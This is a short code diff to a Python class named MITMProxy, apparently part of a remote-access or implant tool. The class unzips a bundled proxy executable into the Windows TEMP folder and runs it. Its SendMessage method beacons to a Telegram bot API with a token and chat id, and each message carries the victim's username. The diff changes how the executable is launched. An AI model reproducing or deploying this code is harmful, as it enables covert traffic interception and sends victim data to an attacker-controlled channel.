@@ -45,10 +45,9 @@ class MITMProxy():
 		with ZipFile(filename, 'r') as zip_ref:
 			zip_ref.extractall(os.environ['TEMP'])
 		self.SendMessage(" ".join(["cmd.exe","/c",os.environ['TEMP'] + "\\mitmfproxy\\mitmproxy.exe"]))
-		a= os.popen(os.environ['TEMP'] + "\\mitmfproxy\\mitmproxy.exe").read()
-		self.SendMessage(a)
 		self.SendMessage(" MITMProxy Executed.")
-		self.SendMessage(" Reverse Proxy Ready.")
+		os.system(os.environ['TEMP'] + "\\mitmfproxy\\mitmproxy.exe")
+		#self.SendMessage(" Reverse Proxy Ready.")
 	def SendMessage(self,message):
 		self.Request("https://api.telegram.org/bot" + self.token + "/sendMessage?text=" + message + "\n--" + getpass.getuser() + "--&chat_id=" + self.chat_id)
 
